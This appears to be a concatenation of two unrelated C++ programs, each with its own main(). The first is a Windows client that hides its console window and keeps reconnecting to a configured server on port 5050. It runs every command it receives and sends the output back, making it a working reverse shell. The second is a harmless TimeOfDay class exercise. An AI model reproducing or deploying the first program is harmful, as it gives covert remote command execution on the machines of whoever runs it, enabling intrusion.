// Simple Windows client that connects to a server, executes received commands, and sends back the output.



#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <cstdio>
#include <string>
#include <thread>
#include <chrono>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
#define SERVER_IP "your Mac IP"  // 🔹 Replace with your Mac IP
#define PORT 5050

std::string executeCommand(const std::string& cmd) {
    std::string result;
    char buffer[128];
    FILE* pipe = _popen(cmd.c_str(), "r");
    if (!pipe) return "Failed to run command.\n";
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer;
    }
    _pclose(pipe);
    if (result.empty()) result = "[no output]\n";
    return result;
}

int connectToServer() {
    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    sockaddr_in serverAddr;

    WSAStartup(MAKEWORD(2, 2), &wsaData);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Socket creation failed.\n";
        WSACleanup();
        return -1;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(PORT);

    if (inet_pton(AF_INET, SERVER_IP, &serverAddr.sin_addr) <= 0) {
        std::cerr << "Invalid IP address.\n";
        closesocket(sock);
        WSACleanup();
        return -1;
    }

    if (connect(sock, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return -1;
    }

    std::cout << "Connected to server.\n";
    return (int)sock;
}

int main() {
    while (true) {
        int sock = connectToServer();

        if (sock < 0) {
            std::cout << "Server not available. Retrying in 5 seconds...\n";
            std::this_thread::sleep_for(std::chrono::seconds(5));
            continue;
        }

        char buffer[1024];
        while (true) {
            memset(buffer, 0, sizeof(buffer));
            int bytes = recv(sock, buffer, sizeof(buffer) - 1, 0);

            if (bytes <= 0) {
                std::cout << "Connection lost. Reconnecting...\n";
                closesocket(sock);
                WSACleanup();
                break; 
            }

            std::string cmd(buffer);
            std::string output = executeCommand(cmd);
            send(sock, output.c_str(), (int)output.size(), 0);
        }


        std::this_thread::sleep_for(std::chrono::seconds(3));
    }

    return 0;
}

#include <iostream>
#include <stdexcept>
#include <iomanip>

class TimeOfDay {
private:
    int h, m, s; // hours, minutes, seconds (0–23, 0–59, 0–59)

    static int toTotal(int hh, int mm, int ss) {
        if (hh < 0 || hh > 23 || mm < 0 || mm > 59 || ss < 0 || ss > 59)
            throw std::out_of_range("Invalid time (out of range)");
        return hh * 3600 + mm * 60 + ss;
    }

    static void fromTotal(int total, int &hh, int &mm, int &ss) {
        if (total < 0 || total > 86399)
            throw std::out_of_range("Total seconds out of range");
        hh = total / 3600;
        mm = (total % 3600) / 60;
        ss = total % 60;
    }

public:
    // Default constructor (00:00:00)
    TimeOfDay() : h(0), m(0), s(0) {}

    // Parameterized constructor
    TimeOfDay(int hh, int mm, int ss) { set(hh, mm, ss); }

    // Destructor
    ~TimeOfDay() {}

    // Set and validate time
    void set(int hh, int mm, int ss) {
        (void)toTotal(hh, mm, ss);
        h = hh; m = mm; s = ss;
    }

    // Read time from user
    void read() {
        int hh, mm, ss;
        std::cout << "Enter time (hours minutes seconds): ";
        std::cin >> hh >> mm >> ss;
        set(hh, mm, ss);
    }

    // Print in 00:00:00 format
    void print() const {
        std::cout << std::setfill('0') << std::setw(2) << h << ":"
                  << std::setw(2) << m << ":" << std::setw(2) << s;
    }

    // Compute time left until end of day
    void timeLeft(int &H, int &M, int &S) const {
        int total = toTotal(h, m, s);
        int delta = 86400 - 1 - total;
        if (delta < 0) delta = 0;
        fromTotal(delta, H, M, S);
    }

    // Add or subtract seconds
    TimeOfDay operator+(int seconds) const {
        int total = toTotal(h, m, s) + seconds;
        if (total < 0 || total > 86399)
            throw std::out_of_range("Resulting time out of range");
        int hh, mm, ss;
        fromTotal(total, hh, mm, ss);
        return TimeOfDay(hh, mm, ss);
    }

    TimeOfDay operator-(int seconds) const {
        return (*this) + (-seconds);
    }
};

int main() {
    std::cout << "=== TimeOfDay Class Demo ===\n";
    TimeOfDay t;
    t.read();

    std::cout << "Current time: ";
    t.print();
    std::cout << "\n";

    int H, M, S;
    t.timeLeft(H, M, S);
    std::cout << "Time left until midnight: "
              << std::setfill('0') << std::setw(2) << H << ":"
              << std::setw(2) << M << ":" << std::setw(2) << S << "\n";

    try {
        TimeOfDay t2 = t + 75;
        std::cout << "t + 75 sec = ";
        t2.print();
        std::cout << "\n";

        TimeOfDay t3 = t - 90;
        std::cout << "t - 90 sec = ";
        t3.print();
        std::cout << "\n";
    } catch (const std::exception &ex) {
        std::cout << "Error: " << ex.what() << "\n";
    }

    return 0;
}

